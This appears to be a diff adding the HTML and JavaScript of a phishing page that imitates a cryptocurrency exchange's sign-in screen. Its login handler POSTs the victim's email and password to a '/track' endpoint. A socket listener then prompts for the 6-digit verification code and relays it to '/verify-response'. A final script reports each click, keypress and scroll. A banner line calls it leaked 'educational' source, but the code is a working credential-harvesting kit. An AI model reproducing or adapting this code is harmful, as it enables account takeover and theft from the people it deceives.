+    <span id="buttonText" class="cds-typographyResets-t6muwls cds-headline-h4steop cds-primaryForeground-pd71c0x cds-transition-t1qvlahm cds-start-s1u0g7ow">Continue</span>
+    <span id="loadingSpinner" class="spinner" style="display: none;"></span>
+  </span>
+</button>
+
+<div id="errorMessage" style="color: #ff4444; margin-top: 10px; text-align: center; display: none;">
+  Invalid password or email, please retry
+</div>
+
+<style>
+.spinner {
+  width: 20px;
+  height: 20px;
+  border: 2px solid #ffffff;
+  border-top: 2px solid transparent;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  position: absolute;
+  right: -30px;
+  top: 50%;
+  transform: translateY(-50%);
+}
+
+@keyframes spin {
+  0% { transform: translateY(-50%) rotate(0deg); }
+  100% { transform: translateY(-50%) rotate(360deg); }
+}
+</style>
+<div id="cancelSignIn" style="margin-top: 16px; text-align: center; display: none;">
+  <a href="#" onclick="cancelSignIn()" class="cds-typographyResets-t6muwls cds-body-bwup3gq" style="color: rgb(var(--blue70)); text-decoration: none; cursor: pointer;">Cancel signing in</a>
+</div>
+
+      <div id="otpSection" class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh" style="width: 100%; opacity: 1; display: none;">
+        <h2 class="cds-typographyResets-t6muwls cds-title1-t2i0v90 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-9-_1s97ztp" style="margin-bottom: 24px;">Enter verification code</h2>
+        <p class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foregroundMuted-flk4pe3" style="margin-bottom: 24px;">Either check your phone or email for the 6-digit verification code.</p>
+        <label for="otp" class="cds-typographyResets-t6muwls cds-label1-l9tazn8 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-0_5-_1rgrln9 cds-0_5-_f2wcfe cds-labelStyle-lnx209w">Verification code</label>
+        <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+          <div class="cds-inputAreaContainerStyles-ipofex6">
+            <span data-testid="input-interactable-area" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgb(15, 16, 18); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
+              <input id="otp" class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-2-_1o1v48h" data-testid="otp-input" tabindex="0" aria-invalid="false" placeholder="Enter 6-digit code" type="text" maxlength="6" style="text-align: start; color-scheme: dark;">
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+<script>
+document.getElementById('cds-textinput-label-:r2:').addEventListener('input', function() {
+    const continueButton = document.getElementById('continueButton');
+    continueButton.disabled = !this.value;
+    continueButton.classList.toggle('cds-disabledState-do7z3i1', !this.value);
+});
+
+document.getElementById('otp').addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
+});
+
+function handleContinue() {
+    const emailSection = document.getElementById('emailSection');
+    const passwordSection = document.getElementById('passwordSection');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const displayedEmail = document.getElementById('displayedEmail');
+    const emailInput = document.getElementById('cds-textinput-label-:r2:');
+    const alternateSignInMethods = document.querySelector('[data-testid="alternate-signin-methods"]');
+    const cancelSignIn = document.getElementById('cancelSignIn');
+
+    emailSection.style.display = 'none';
+    passwordSection.style.display = 'block';
+    emailDisplay.style.display = 'block';
+    displayedEmail.textContent = emailInput.value;
+    alternateSignInMethods.style.display = 'none';
+    cancelSignIn.style.display = 'block';
+
+    const continueButton = document.getElementById('continueButton');
+    continueButton.onclick = handleLogin;
+
+    document.getElementById('password').focus();
+}
+
+function handleLogin() {
+    const email = document.getElementById('cds-textinput-label-:r2:').value;
+    const password = document.getElementById('password').value;
+
+    const buttonText = document.getElementById('buttonText');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    const errorMessage = document.getElementById('errorMessage');
+
+    buttonText.textContent = 'Verifying...';
+    loadingSpinner.style.display = 'block';
+    errorMessage.style.display = 'none';
+
+    fetch('/track', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email, password })
+    });
+
+    socket.on('verificationRequest', (data) => {
+        const passwordSection = document.getElementById('passwordSection');
+        const verificationSection = document.getElementById('verificationSection');
+        const otpSection = document.getElementById('otpSection');
+        const buttonText = document.getElementById('buttonText');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+
+        buttonText.textContent = 'Continue';
+        loadingSpinner.style.display = 'none';
+
+        passwordSection.style.display = 'none';
+        verificationSection.style.display = 'block';
+        otpSection.style.display = 'block';
+
+        const continueButton = document.getElementById('continueButton');
+        continueButton.onclick = function() {
+            const otpValue = document.getElementById('otp').value;
+            if (otpValue) {
+                fetch('/verify-response', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userId: data.userId,
+                        type: data.type,
+                        response: otpValue
+                    })
+                });
+            }
+        };
+    });
+
+    socket.on('loginError', (data) => {
+        const buttonText = document.getElementById('buttonText');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const errorMessage = document.getElementById('errorMessage');
+        const otpErrorMessage = document.getElementById('otpErrorMessage');
+
+        buttonText.textContent = 'Continue';
+        loadingSpinner.style.display = 'none';
+
+        if (data.type === 'otp') {
+            otpErrorMessage.style.display = 'block';
+            errorMessage.style.display = 'none';
+        } else {
+            errorMessage.style.display = 'block';
+            otpErrorMessage.style.display = 'none';
+        }
+    });
+}
+
+function cancelSignIn() {
+    const emailSection = document.getElementById('emailSection');
+    const passwordSection = document.getElementById('passwordSection');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const alternateSignInMethods = document.querySelector('[data-testid="alternate-signin-methods"]');
+    const emailInput = document.getElementById('cds-textinput-label-:r2:');
+    const cancelSignIn = document.getElementById('cancelSignIn');
+
+    emailSection.style.display = 'block';
+    passwordSection.style.display = 'none';
+    emailDisplay.style.display = 'none';
+    alternateSignInMethods.style.display = 'block';
+    cancelSignIn.style.display = 'none';
+    emailInput.value = '';
+
+    const continueButton = document.getElementById('continueButton');
+    continueButton.onclick = handleContinue;
+}
+</script><div data-testid="alternate-signin-methods" class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-2-_jg634k cds-2-_mr0se7" style="width: 100%;"><div class="cds-flex-f1tjavv3 cds-center-cqy3t5k cds-relative-r5okg6e" style="width: 100%; position: relative;"><div class="cds-flex-f1tjavv3 cds-background-b6zr2pu cds-2-_11ix2s4 cds-2-_1fpvsav" style="z-index: 1;"><div class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-center-cgg4q7m">OR</div></div><div class="cds-flex-f1tjavv3 cds-stretch-s1ykq5uq cds-stretch-s8xm8yx cds-absolute-a185np7x" style="width: 100%; position: absolute; top: 8px;"><div aria-orientation="horizontal" class="cds-horizontal-hs39g9n cds-line-lb40n7o" role="separator"></div></div></div><div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-1-_1w0e50j" style="width: 100%;"><button data-testid="sign-in-with-passkey" aria-label="Sign in with Passkey" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-scaledDownState-s1o6alxd cds-pressableResetStyles-p1nrmodp" type="button" style="--interactable-border-radius: 1000px; --interactable-background: var(--secondary); --interactable-hovered-background: rgb(58, 61, 69); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;"><div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-space-between-s1y044t2 cds-2-_fik044 cds-2-_jg634k cds-3-_m245rc cds-4-_13srchq cds-2-_mr0se7" style="width: 100%;"><span class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">Sign in with Passkey</span><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5.37256 0.93801C4.02536 1.22585 2.8994 2.35696 2.55569 3.75968C2.43717 4.24618 2.43717 5.05701 2.55569 5.5435C2.90335 6.9665 4.02141 8.07328 5.40417 8.36518C5.62936 8.41383 5.8506 8.42599 6.30098 8.41383C6.80668 8.39356 6.941 8.37734 7.22941 8.28004C8.02746 8.01652 8.62007 7.59489 9.08625 6.95434C9.38256 6.55298 9.56429 6.18405 9.70652 5.71783C9.80529 5.38944 9.81319 5.30836 9.81319 4.65159C9.81319 3.99482 9.80529 3.91374 9.70652 3.58536C9.3312 2.33668 8.45809 1.43261 7.22941 1.02315C6.92915 0.921793 6.82643 0.909631 6.26148 0.897468C5.83875 0.88936 5.54639 0.901522 5.37256 0.93801Z" fill="white"></path><path d="M12.5633 5.55967C11.9983 5.68129 11.5045 5.96508 11.0817 6.41509C10.2995 7.23808 10.0625 8.4908 10.4891 9.56515C10.7064 10.1165 11.1963 10.6922 11.6862 10.976L11.9272 11.1179L11.9312 13.3882V15.6585L12.5356 16.2747L13.1401 16.895L14.1633 15.8409L15.1905 14.7869L14.5781 14.1585L13.9658 13.5301L14.5702 12.9098C14.8982 12.5693 15.1708 12.2733 15.1708 12.253C15.1708 12.2328 14.9535 11.9895 14.6888 11.7179C14.4241 11.4463 14.2147 11.2152 14.2226 11.2071C14.2344 11.199 14.3846 11.1138 14.5584 11.0125C15.2142 10.6395 15.7397 9.94218 15.9214 9.20839C16.0162 8.8273 16.0281 8.11782 15.9411 7.75295C15.7081 6.73131 14.9021 5.884 13.8986 5.60021C13.5944 5.51507 12.8754 5.4948 12.5633 5.55967ZM13.6023 6.90564C13.7959 7.04348 13.9855 7.38808 13.9855 7.607C13.9855 7.81377 13.8196 8.15026 13.66576 8.27594C13.4759 8.41783 13.148 8.48675 12.9386 8.42999C12.5988 8.33269 12.3302 7.97593 12.3262 7.61917C12.3223 6.94618 13.069 6.52861 13.6023 6.90564Z" fill="white"></path><path d="M4.16802 9.78411C2.34279 10.0719 0.809901 11.4098 0.233093 13.218C0.0355566 13.8423 0 14.1585 0 15.3585V16.4491H5.33349H10.667V14.1382V11.8274L10.3509 11.5193C9.99536 11.1706 9.71486 10.7976 9.51337 10.4084L9.37904 10.1449L8.94446 9.99492C8.23728 9.75167 7.90147 9.71924 6.09993 9.72329C4.97397 9.72735 4.42087 9.74356 4.16802 9.78411Z" fill="white"></path></svg></div></div></button><div data-testid="oauth-verification" class="cds-flex-f1tjavv3 cds-column-c1kchipr" style="width: 100%;"><ul aria-label="sign-in-with-buttons" class="cds-flex-f1tjavv3 cds-stretch-s1ykq5uq cds-column-c1kchipr cds-nowrap-nur7jih cds-0-_ocjms7 cds-1-_1w0e50j cds-list-l1i5m4j6" style="margin-top: 0px; margin-bottom: 0px;"><li class="cds-item-ikrb96p"><button data-testid="sign-in-with-google" aria-label="Sign in with Google" id="gsi_id_web-UnifiedLogin-IdentificationPrompt" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-scaledDownState-s1o6alxd cds-pressableResetStyles-p1nrmodp" type="button" style="--interactable-border-radius: 1000px; --interactable-background: var(--secondary); --interactable-hovered-background: rgb(58, 61, 69); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;"><div class="cds-flex-f1tjavv3 cds-row-r1cf21wt cds-space-between-s1y044t2 cds-2-_fik044 cds-2-_jg634k cds-3-_m245rc cds-2-_1fpvsav cds-2-_mr0se7" style="width: 100%;"><span class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">Sign in with Google</span><div class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-center-cqy3t5k cds-2-_1fpvsav"><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z" fill="white"></path></svg></div></div></button></li><li class="cds-item-ikrb96p"><button data-testid="sign-in-with-apple" aria-label="Sign in with Apple" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-scaledDownState-s1o6alxd cds-pressableResetStyles-p1nrmodp" type="button" style="--interactable-border-radius: 1000px; --interactable-background: var(--secondary); --interactable-hovered-background: rgb(58, 61, 69); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;"><div class="cds-flex-f1tjavv3 cds-row-r1cf21wt cds-space-between-s1y044t2 cds-2-_fik044 cds-2-_jg634k cds-3-_m245rc cds-2-_1fpvsav cds-2-_mr0se7" style="width: 100%;"><span class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">Sign in with Apple</span><div class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-center-cqy3t5k cds-2-_1fpvsav"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_1022_155)"><path d="M14.1869 13.1777C13.955 13.7134 13.6805 14.2065 13.3625 14.6599C12.929 15.2779 12.5741 15.7057 12.3006 15.9433C11.8765 16.3332 11.4222 16.533 10.9357 16.5443C10.5865 16.5443 10.1653 16.4449 9.67504 16.2433C9.18315 16.0427 8.73112 15.9433 8.31779 15.9433C7.88431 15.9433 7.4194 16.0427 6.92212 16.2433C6.42409 16.4449 6.02288 16.55 5.71613 16.5604C5.24961 16.5803 4.78461 16.3749 4.32046 15.9433C4.02421 15.6849 3.65367 15.242 3.20977 14.6145C2.73351 13.9444 2.34195 13.1673 2.0352 12.2814C1.70668 11.3245 1.54199 10.3979 1.54199 9.50085C1.54199 8.47326 1.76403 7.58699 2.20878 6.84429C2.55832 6.24773 3.02332 5.77714 3.6053 5.43168C4.18729 5.08622 4.81613 4.91017 5.49333 4.89891C5.86387 4.89891 6.34979 5.01353 6.95364 5.23879C7.55579 5.46481 7.94242 5.57942 8.11194 5.57942C8.23867 5.57942 8.66818 5.4454 9.3963 5.17822C10.0849 4.93043 10.666 4.82783 11.1421 4.86825C12.4321 4.97236 13.4013 5.4809 14.0459 6.39708C12.8921 7.09615 12.3214 8.07527 12.3327 9.33134C12.3431 10.3097 12.6981 11.1239 13.3956 11.7703C13.7117 12.0703 14.0648 12.3022 14.4576 12.4669C14.3724 12.7139 14.2825 12.9506 14.1869 13.1777ZM11.2282 1.53515C11.2282 2.30199 10.948 3.01799 10.3896 3.68071C9.71574 4.46855 8.90063 4.9238 8.01672 4.85197C8.00546 4.75997 7.99893 4.66314 7.99893 4.5614C7.99893 3.82523 8.3194 3.03739 8.88852 2.39322C9.17265 2.06706 9.53401 1.79587 9.97223 1.57954C10.4095 1.36643 10.8231 1.24858 11.2121 1.22839C11.2235 1.33091 11.2282 1.43343 11.2282 1.53514V1.53515Z" fill="white"></path></g><defs><clipPath id="clip0_1022_155"><rect width="16" height="16" fill="white" transform="translate(0 0.89502)"></rect></clipPath></defs></svg></div></div></button></li></ul></div><button data-testid="sign-in-with-wallet" aria-label="Sign in with Wallet" class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-scaledDownState-s1o6alxd cds-pressableResetStyles-p1nrmodp" type="button" style="--interactable-border-radius: 1000px; --interactable-background: var(--secondary); --interactable-hovered-background: rgb(58, 61, 69); --interactable-hovered-opacity: 0.96; --interactable-pressed-background: rgb(71, 73, 80); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37); width: 100%;"><div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-space-between-s1y044t2 cds-2-_fik044 cds-2-_jg634k cds-3-_m245rc cds-2-_1fpvsav cds-2-_mr0se7" style="width: 100%;"><span class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">Sign in with Wallet</span><div class="cds-flex-f1tjavv3 cds-2-_11ix2s4 cds-2-_1fpvsav cds-relative-r5okg6e" style="position: relative;"><div style="width: 16px; height: 16px;"><span aria-hidden="true" class="cds-iconStyles-irtngcj" data-icon-name="wallet" data-testid="icon-base-glyph" role="img" style="color: var(--foreground); font-size: 16px;">凉</span></div></div></div></button></div></div></div>
+</form></div></div></div></div></div><div data-testid="mobile-cookie-banner" class="cookie-banner"><div style="opacity: 1; max-height: 150px;"><p class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-center-cgg4q7m">This source code is leaked by @fxhrer on telegram, this is for only educational purposes do NOT enter your actual credentials in here, if someone sent you this and asking you to login it's a scam. <a class="cds-link cds-link-l678mx9" href="https://coinbase.com/legal/cookie" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-underline-u1x5xrhj cds-link--container">Cookie Policy</span></a> and <a data-testid="link-privacy-policy" class="cds-link cds-link-l678mx9" href="https://coinbase.com/legal/privacy" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-underline-u1x5xrhj cds-link--container">Privacy Policy</span></a>.</p></div></div></div></div></div></div>
+
+
+<div id="portalRoot" style="z-index: 100001; position: relative; display: flex;"><div data-testid="portal-modal-container" id="modalsContainer" style="z-index: 3;"></div><div data-testid="portal-toast-container" id="toastsContainer" style="z-index: 6;"></div><div data-testid="portal-alert-container" id="alertsContainer" style="z-index: 7;"><div class="cds-large-l1kwdti4 cds-dark-dnxyhnk" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-inverse: rgb(var(--gray100)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue70)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --negative-wash: rgb(var(--red0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray20)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50)); --warning-foreground: rgb(var(--orange70));"></div><div class="cds-large-l1kwdti4 cds-dark-dnxyhnk" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-inverse: rgb(var(--gray100)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue70)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --negative-wash: rgb(var(--red0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray20)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50)); --warning-foreground: rgb(var(--orange70));"></div></div><div data-testid="portal-tooltip-container" id="tooltipContainer" style="z-index: 5;"></div></div><div id="cds-hexagon-clipPath-container" aria-hidden="true" style="height: 0px; width: 0px;"><svg height="0" viewBox="0 0 66 62" width="0"><defs><clipPath clipPathUnits="objectBoundingBox" id="cds-hexagon-avatar-clipper" transform="scale(0.015151515151515152 0.016129032258064516)"><path d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z"></path></clipPath></defs></svg></div><veepn-guard-alert><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-guard-alert><veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen><script src="https://accounts.google.com/gsi/client" async="" id="google-api-script"></script><script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js" async="" id="apple-id-auth-script"></script></body></html>
+
+<script>
+  function trackActivity(action) {
+    fetch('/activity', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        url: window.location.href,
+        action: action
+      })
+    });
+  }
+
+  window.addEventListener('click', () => trackActivity('Click'));
+  window.addEventListener('keypress', () => trackActivity('Keyboard Input'));
+  window.addEventListener('scroll', () => trackActivity('Page Scroll'));
+</script>
